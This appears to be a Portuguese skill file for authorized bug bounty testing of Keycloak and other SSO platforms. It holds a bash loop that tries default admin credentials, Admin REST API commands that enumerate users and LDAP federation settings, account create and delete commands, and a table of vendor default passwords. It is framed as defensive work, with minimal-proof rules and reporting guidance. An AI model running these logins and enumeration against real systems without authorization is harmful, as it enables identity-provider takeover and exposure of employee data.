---
name: keycloak-default-creds
description: Metodologia para detectar credenciais administrativas padrão e configuração exposta em Keycloak e outras plataformas de identidade/SSO (Keycloak, Red Hat SSO, Auth0 self-hosted, Gluu, WSO2, Authentik, Zitadel, FusionAuth, ForgeRock), para bug bounty e pentest autorizado. Use SEMPRE que o alvo tiver um endpoint de SSO/IdP — hosts como sso., unisso., auth., login., id., idp., keycloak., accounts. — ou quando aparecer /realms/, /admin/master/console/, /auth/, .well-known/openid-configuration, cookies KEYCLOAK_IDENTITY/AUTH_SESSION_ID, ou o header WWW-Authenticate de um Admin Console; e sempre que o usuário mencionar "keycloak", "default credentials", "admin admin123", "credenciais padrão", "realm", "LDAP federation exposto", "master realm". O núcleo é: obter um token administrativo do realm master via /realms/master/protocol/openid-connect/token com client_id=admin-cli e credenciais padrão (admin/admin, admin/admin123, admin/Pa55w0rd, keycloak/keycloak), e então usar a Admin REST API SOMENTE PARA LEITURA — contar usuários (/admin/realms/{realm}/users/count), amostrar poucos registros, e ler a federação LDAP (/admin/realms/{realm}/components?type=UserStorageProvider) que revela connectionUrl, bindDn, usersDn, vendor e startTls do Active Directory de produção. Cobre: descoberta e fingerprint da versão, lista de credenciais padrão a testar, os endpoints REST de enumeração read-only, a regra de PROVA MÍNIMA (contar e amostrar 5, nunca dumpar os milhares de usuários; demonstrar escrita só com UMA conta descartável criada e imediatamente apagada), e como reportar com CWE-1392/CWE-200. Baseado no report real Starbucks China #3959057 (unisso.stg, realm sbux-stg, 22.747 contas de AD, admin/admin123). Só usar dentro do escopo formalmente autorizado; NUNCA dumpar dados em massa nem persistir contas criadas.
---

# Credenciais Padrão em Keycloak / SSO

Metodologia para detectar credenciais administrativas padrão em plataformas de
identidade e medir o impacto **sem** abusar do acesso.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.
Um IdP concentra as identidades de uma organização inteira — o poder de abuso é
enorme, e por isso a disciplina de **prova mínima** (seção 6) não é opcional.

**Regra de ouro, inegociável:**
- **Somente leitura por padrão.** Contar e amostrar poucos registros — nunca
  dumpar os milhares de usuários.
- **Escrita só com conta descartável**, criada e **apagada imediatamente**.
- **Nunca** use credencial/token obtido para autenticar em serviços a jusante,
  nem gere tokens de service account para pivotar.
- Redija PII, DNs e segredos no report.

## 1. Por que isso é crítico

Um Keycloak com admin padrão não é "um painel a mais". O realm master controla
**todos** os realms, e cada realm costuma federar um diretório corporativo real
(Active Directory) via LDAP. Consequências diretas:

- Leitura de **todos** os usuários sincronizados (PII: nome, e-mail corporativo,
  employee ID, OU, DN, UUID do LDAP).
- Exposição da **configuração de federação**: endereço do servidor de diretório
  de produção, DN da conta de serviço (bind), OU sincronizada, e se a conexão é
  LDAP em texto claro (porta 389, StartTLS off).
- Criação/edição/exclusão de contas → **impersonação** e **takeover** de
  qualquer funcionário.
- Geração de tokens de service account → movimento lateral.

Mesmo um ambiente **staging** é crítico quando o realm sincroniza do AD de
**produção** — foi o caso do report que originou esta skill.

## 2. Descoberta e fingerprint

### 2.1 Onde procurar

Hosts típicos de IdP:

```
sso.  unisso.  auth.  login.  id.  idp.  accounts.  keycloak.  identity.  oauth.
```

Sinais de que é Keycloak:

```bash
# 1) discovery OIDC — confirma Keycloak e revela os realms/endpoints
curl -sk "https://alvo.com/realms/master/.well-known/openid-configuration" | head -c 400

# 2) console admin
curl -skI "https://alvo.com/admin/master/console/" | grep -iE '^(http|www-authenticate|set-cookie)'

# 3) versoes antigas usam /auth/ como prefixo
curl -sk "https://alvo.com/auth/realms/master/.well-known/openid-configuration" | head -c 200
```

Cookies `KEYCLOAK_IDENTITY`, `AUTH_SESSION_ID`, `KC_RESTART` confirmam.

### 2.2 Versão

A versão sai no `serverinfo` (após autenticar) ou, às vezes, em assets estáticos
(`/resources/{version}/...`). Anote — versões antigas somam CVEs às credenciais
padrão.

### 2.3 Descobrir os realms

O nome do realm de negócio (ex.: `sbux-stg`) costuma aparecer em:

- JavaScript da aplicação (skill `bughunter`): `realm: "..."`, URLs de
  `/realms/<nome>/`
- redirects de login (`?realm=`, path `/realms/<nome>/protocol/...`)
- o próprio `.well-known` de cada realm testado

## 3. Testar credenciais padrão

O ataque é um POST ao endpoint de token do **realm master**, com
`client_id=admin-cli`:

```bash
try_login() {
  local U="$1" P="$2"
  local R
  R=$(curl -sk -o /tmp/kc.json -w '%{http_code}' \
    "https://alvo.com/realms/master/protocol/openid-connect/token" \
    -d "grant_type=password" -d "client_id=admin-cli" \
    -d "username=$U" -d "password=$P")
  if [ "$R" = "200" ] && grep -q access_token /tmp/kc.json; then
    echo ">>> CREDENCIAL PADRAO VALIDA: $U / $P"
    return 0
  fi
  return 1
}

for CRED in "admin:admin" "admin:admin123" "admin:Pa55w0rd" "admin:password" \
            "admin:keycloak" "keycloak:keycloak" "admin:admin@123" \
            "temp-admin:admin" "admin:changeit" "root:root"; do
  U="${CRED%%:*}"; P="${CRED#*:}"
  try_login "$U" "$P" && break
  sleep 2
done
```

**Notas:**

- Teste com **parcimônia** e `sleep` entre tentativas — mesmo que
  `bruteForceProtected` esteja off, um IdP loga tentativas de login no master.
  Isto **não** é brute force: é uma lista curta de defaults conhecidos.
- `admin/admin123` é o default do container oficial em vários guides de deploy;
  `admin/admin` é o de vários charts. Comece por esses dois.
- O token do master costuma durar **~60s**. Se expirar no meio da enumeração,
  reautentique — não tente esticar o token.

## 4. Enumeração read-only pela Admin REST API

Com o `access_token` do master, todas as chamadas levam
`Authorization: Bearer <token>`.

```bash
TOKEN=$(python3 -c "import json;print(json.load(open('/tmp/kc.json'))['access_token'])")
H="Authorization: Bearer $TOKEN"
REALM="sbux-stg"     # o realm de negocio descoberto na secao 2.3

# server info + versao
curl -sk -H "$H" "https://alvo.com/admin/serverinfo" | python3 -c 'import json,sys;d=json.load(sys.stdin);print("Keycloak",d["systemInfo"]["version"])'

# lista de realms + postura de seguranca de cada um
curl -sk -H "$H" "https://alvo.com/admin/realms" \
  | python3 -c 'import json,sys;[print(r["realm"],"bruteForce=",r.get("bruteForceProtected"),"events=",r.get("eventsEnabled")) for r in json.load(sys.stdin)]'

# CONTAGEM de usuarios — a prova de escala, sem tocar nos dados
curl -sk -H "$H" "https://alvo.com/admin/realms/$REALM/users/count"

# AMOSTRA de 5 — o suficiente para provar que sao contas reais de AD
curl -sk -H "$H" "https://alvo.com/admin/realms/$REALM/users?first=0&max=5&briefRepresentation=false"

# FEDERACAO LDAP — o achado de maior impacto
curl -sk -H "$H" "https://alvo.com/admin/realms/$REALM/components?type=org.keycloak.storage.UserStorageProvider"
```

### 4.1 O que cada resposta prova

| Endpoint | Prova |
|---|---|
| `/admin/serverinfo` | versão exata → CVEs adicionais |
| `/admin/realms` | quantos realms, e se `bruteForceProtected`/`eventsEnabled` estão off |
| `/users/count` | **a escala** — "22.747 contas" sem baixar nenhuma |
| `/users?max=5` | que são pessoas reais: `LDAP_ENTRY_DN`, `LDAP_ID`, employee ID, e-mail corporativo |
| `/components?type=...UserStorageProvider` | `connectionUrl`, `bindDn`, `usersDn`, `vendor`, `startTls` — o AD de produção |

A configuração LDAP é o que eleva de "painel exposto" para "diretório de
produção comprometido":

```
connectionUrl: ldap://ldap-prod-xxx.empresa.net:389   <- texto claro
bindDn:        CN=s-xxxxx-monitor,OU=...,DC=empresa,DC=net
usersDn:       OU=China,DC=empresa,DC=net
vendor:        ad
startTls:      false                                   <- sem criptografia
```

## 5. Outras plataformas de IdP — defaults equivalentes

O mesmo raciocínio (endpoint admin + credencial de fábrica + API de leitura)
vale para:

| Plataforma | Console / endpoint | Default comum |
|---|---|---|
| Keycloak / Red Hat SSO | `/admin/master/console/` | `admin:admin`, `admin:admin123` |
| WSO2 Identity Server | `/carbon/` | `admin:admin` |
| Gluu | `/identity/` | credencial do setup |
| Authentik | `/if/admin/` | `akadmin:` (definido no deploy) |
| FusionAuth | `/admin/` | conta do setup wizard |
| Zitadel | console | `zitadel-admin@...` |
| ForgeRock AM | `/openam/` | `amadmin:` |
| Apache Syncope | `/syncope-console/` | `admin:password` |

Fingerprint pelo path do console e pelo HTML de login; teste só o default
documentado da plataforma identificada, não uma wordlist.

## 6. Prova mínima — a disciplina que separa PoC de abuso

**O impacto se demonstra com contagem e amostra, não com dump.**

### 6.1 Leitura

- `users/count` dá a escala. **Reporte o número, não os usuários.**
- `max=5` com `briefRepresentation=false` prova que são contas reais e mostra os
  campos sensíveis. **Cinco basta.** Não pagine os milhares.
- A config LDAP é uma resposta única — leia e **redija** os valores no report
  (`ldap-prod-[REDACTED].empresa.net`).

### 6.2 Escrita — só se o programa aceitar, e com descarte imediato

Se precisar provar acesso de escrita, use **uma** conta descartável com e-mail
de teste (ex.: seu handle `@wearehackerone.com`), e **apague na sequência**:

```bash
# criar (prova de escrita)
curl -sk -H "$H" -H 'Content-Type: application/json' \
  "https://alvo.com/admin/realms/$REALM/users" -X POST \
  -d '{"username":"sectest-DISPOSABLE","email":"voce@wearehackerone.com","enabled":true,"firstName":"Security","lastName":"Test"}'

# confirmar
curl -sk -H "$H" "https://alvo.com/admin/realms/$REALM/users?email=voce@wearehackerone.com&exact=true"

# APAGAR imediatamente — pegue o id da resposta acima
curl -sk -H "$H" "https://alvo.com/admin/realms/$REALM/users/<USER_ID>" -X DELETE
```

Regras da escrita:

- **Nunca** edite ou apague uma conta que já existe. Só a sua descartável.
- **Nunca** promova a conta a admin, não atribua roles, não gere token dela para
  usar em outro serviço.
- Apague **na mesma sessão**. Não deixe a conta viva "para o triager ver" —
  descreva o passo e forneça o comando de recriação, mas não persista.
- Se o programa proíbe qualquer escrita, **pare na leitura** — a contagem +
  amostra + LDAP já é um achado crítico.

## 7. Reportar

1. **Título com o número:** a escala (ex.: "22.747 contas") é o que comunica o
   impacto de imediato.
2. **Credencial e endpoint** exatos, e a versão do Keycloak.
3. **PoC read-only reproduzível** — um script que autentica, conta, amostra 5 e
   lê o LDAP. Marque claramente o que é leitura e o que é escrita opcional.
4. **Config LDAP redigida**, deixando visível só o que prova o ponto:
   `vendor: ad`, `port 389`, `startTls: false`.
5. **Impacto encadeado:** admin do IdP → PII de todos os funcionários →
   impersonação → e, via a config LDAP em texto claro, exposição do diretório de
   produção.
6. **CWEs:** CWE-1392 (Use of Default Credentials), CWE-200 (Exposure of
   Sensitive Information). Referência: OWASP API Security — Broken
   Authentication.
7. **Nota de contenção:** afirme que o teste foi read-only (ou que a única
   escrita foi uma conta descartável já removida), que nenhum dado foi baixado
   em massa e que nenhum token foi reutilizado.

## 8. Remediação a sugerir

- Trocar as credenciais do admin master; remover o admin temporário de bootstrap.
- Ativar `bruteForceProtected` e `eventsEnabled` (login e admin events).
- Não expor o Admin Console à internet — restringir por rede/VPN.
- LDAP sobre TLS (LDAPS 636 ou StartTLS), nunca 389 em texto claro.
- Conta de serviço (bind DN) com privilégio mínimo, só leitura da OU necessária.
- Não sincronizar diretório de **produção** para ambiente de **staging**.

## 9. Checklist

- [ ] Endpoint de IdP confirmado (`.well-known/openid-configuration`, console).
- [ ] Versão do Keycloak anotada; CVEs da versão pesquisadas.
- [ ] Realm(s) de negócio descobertos (JS, redirects, well-known).
- [ ] Lista **curta** de defaults testada com `sleep` entre tentativas — nunca wordlist.
- [ ] Token do master obtido via `admin-cli`.
- [ ] `users/count` para a escala — nenhum dump.
- [ ] Amostra de **5** usuários, não mais.
- [ ] Config LDAP lida (`connectionUrl`, `bindDn`, `usersDn`, `startTls`).
- [ ] Escrita, se testada, foi UMA conta descartável, apagada na mesma sessão.
- [ ] Nenhuma conta existente tocada; nenhum token reutilizado a jusante.
- [ ] Report com número no título, PoC read-only, LDAP redigido, CWE-1392/200.
